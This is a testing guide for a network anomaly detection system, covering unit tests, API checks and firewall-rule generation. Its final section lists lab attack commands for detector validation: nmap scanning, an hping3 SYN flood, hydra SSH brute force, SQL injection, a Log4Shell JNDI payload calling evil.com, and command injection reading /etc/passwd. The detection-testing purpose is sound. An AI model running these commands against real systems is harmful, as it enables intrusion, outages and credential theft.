# Network Anomaly Detection (NAD) — Testing & Validation Guide

Comprehensive testing protocols covering unit tests, API integration tests, ingestion mode switching, remote agent validation, and real-world penetration simulation.

---

## 1. Automated Test Suite

The system includes two comprehensive test modules:
- [`tests/test_connect.py`](file:///home/dereje/project/NAD/tests/test_connect.py): Universal Connect system, interface discovery, agent authentication lifecycle, allowlist IP/CIDR filtering, asset inventory, and dynamic mode switching.
- [`tests/test_smoke.py`](file:///home/dereje/project/NAD/tests/test_smoke.py): REST API endpoints, telemetry stats shape, MITRE intelligence fields, detector catalog coverage, signature engine unit tests, and v3 attack rules.

### Running Automated Tests:

```bash
# Run Connect & Agent Unit Tests (independent of running server)
python3 -m unittest tests/test_connect.py -v

# Run Full Pytest Suite (requires backend running on :8000)
make test
# Or directly:
pytest tests/ -v
```

### Running Tests Inside Docker:
```bash
docker exec nad-backend-1 python3 -m unittest tests/test_connect.py -v
```

### One-Shot Shell Smoke Check:
```bash
make smoke
# Or with explicit host:port:
bash scripts/smoke.sh 127.0.0.1:8000
```

---

## 2. Ingestion Mode Validation

### A. Testing Mode Switching via API
Verify that the backend transitions cleanly between capture modes without dropping connections:
```bash
# 1. Switch to high-intensity simulation
curl -s -X POST http://127.0.0.1:8000/api/connect/mode \
  -H "Content-Type: application/json" \
  -d '{"mode": "simulate", "intensity": "stress", "attacks": ["floods", "scans"]}' | python3 -m json.tool

# 2. Check current capture status
curl -s http://127.0.0.1:8000/api/connect/status | python3 -m json.tool
```

### B. Testing Host Interface Discovery & 10s Packet Probe
Verify that the system detects your machine's physical network adapters and can sample traffic:
```bash
# List all host interfaces with IP, MAC, MTU, and status
curl -s http://127.0.0.1:8000/api/connect/interfaces | python3 -m json.tool

# Run a 10-second traffic sample on eth0 or lo
curl -s -X POST http://127.0.0.1:8000/api/connect/interfaces/test \
  -H "Content-Type: application/json" \
  -d '{"interface": "lo", "duration": 3}' | python3 -m json.tool
```

### C. Testing PCAP Replay
Verify file upload and streaming playback:
```bash
curl -X POST http://127.0.0.1:8000/api/connect/pcap/upload \
  -F "file=@data/sample_attacks.pcap" \
  -F "speed=5x" | python3 -m json.tool

# Query playback progress
curl -s http://127.0.0.1:8000/api/connect/pcap/status | python3 -m json.tool
```

---

## 3. Remote Telemetry Agent Verification

Test the complete agent onboarding and ingestion loop:

### Step 1: Issue an Agent Token
```bash
TOKEN_JSON=$(curl -s -X POST http://127.0.0.1:8000/api/agents/tokens \
  -H "Content-Type: application/json" \
  -d '{"name": "Lab-PC-01", "site": "Engineering Lab"}')
echo $TOKEN_JSON
TOKEN=$(echo $TOKEN_JSON | python3 -c "import sys, json; print(json.load(sys.stdin)['agent']['token'])")
```

### Step 2: Send Synthetic Telemetry Ingestion
```bash
curl -s -X POST http://127.0.0.1:8000/api/agents/ingest \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "packets_delta": 450,
    "bytes_delta": 185000,
    "pps": 90.0,
    "top_talkers": [
      {"ip": "10.0.0.15", "port": 443, "proto": "TCP", "packets": 300, "bytes": 120000}
    ]
  }' | python3 -m json.tool
```

### Step 3: Verify Agent Status in Fleet
```bash
curl -s http://127.0.0.1:8000/api/agents | python3 -m json.tool
```
The agent should appear with `status: "ONLINE"` and updated packet counters.

---

## 4. Allowlist & Threat Suppression Testing

Verify that legitimate administrative workstations or security scanners do not trigger false alerts:

```bash
# 1. Add allowlist rule for scanner IP
curl -s -X POST http://127.0.0.1:8000/api/allowlist \
  -H "Content-Type: application/json" \
  -d '{"cidr_or_ip": "192.168.1.50", "description": "Nessus Security Scanner"}' | python3 -m json.tool

# 2. Verify rule is registered
curl -s http://127.0.0.1:8000/api/allowlist | python3 -m json.tool

# 3. Verify suppression via Python unit test
python3 -c "
from backend.database.db import db
assert db.is_allowlisted('192.168.1.50') == True
assert db.is_allowlisted('192.168.1.99') == False
print('Allowlist verification SUCCESS')
"
```

---

## 5. Safe Firewall Remediation Testing

Verify that the engine can generate exact syntax for blocking attacking IPs across multiple operating systems:

```bash
# Linux iptables rule
curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
  -H "Content-Type: application/json" \
  -d '{"ip": "203.0.113.45", "firewall_type": "iptables"}' | python3 -m json.tool

# Windows netsh rule
curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
  -H "Content-Type: application/json" \
  -d '{"ip": "203.0.113.45", "firewall_type": "windows-netsh"}' | python3 -m json.tool

# Cisco IOS ACL
curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
  -H "Content-Type: application/json" \
  -d '{"ip": "203.0.113.45", "firewall_type": "cisco-acl"}' | python3 -m json.tool
```

---

## 6. Live Penetration Simulation in an Isolated Lab

> [!WARNING]
> Conduct active penetration tests **only** against isolated virtual machines or test hardware you own and have explicit authorization to audit.

Set the backend to live capture (`make live IFACE=eth0`). From a secondary test machine (e.g. Kali Linux):

| Attack Category | Test Command | Expected Alert | Detection Time |
|---|---|---|---|
| **SYN Port Scan** | `nmap -sS -T4 <TARGET_IP>` | `Port Scan` | < 1 second |
| **SYN Flood** | `hping3 -S --flood -p 80 <TARGET_IP>` | `SYN Flood` | < 2 seconds |
| **SSH Brute Force** | `hydra -l root -P pass.txt ssh://<TARGET_IP>` | `SSH Brute Force` | Immediate |
| **SQL Injection** | `curl "http://<TARGET_IP>:8000/search?q=' UNION SELECT 1,2--"` | `SQL Injection` | Instantaneous |
| **Log4Shell RCE** | `curl "http://<TARGET_IP>:8000/?q=\${jndi:ldap://evil.com/x}"` | `Log4Shell` | Instantaneous |
| **Command Injection**| `curl "http://<TARGET_IP>:8000/run?cmd=test;cat /etc/passwd"` | `Command Injection` | Instantaneous |
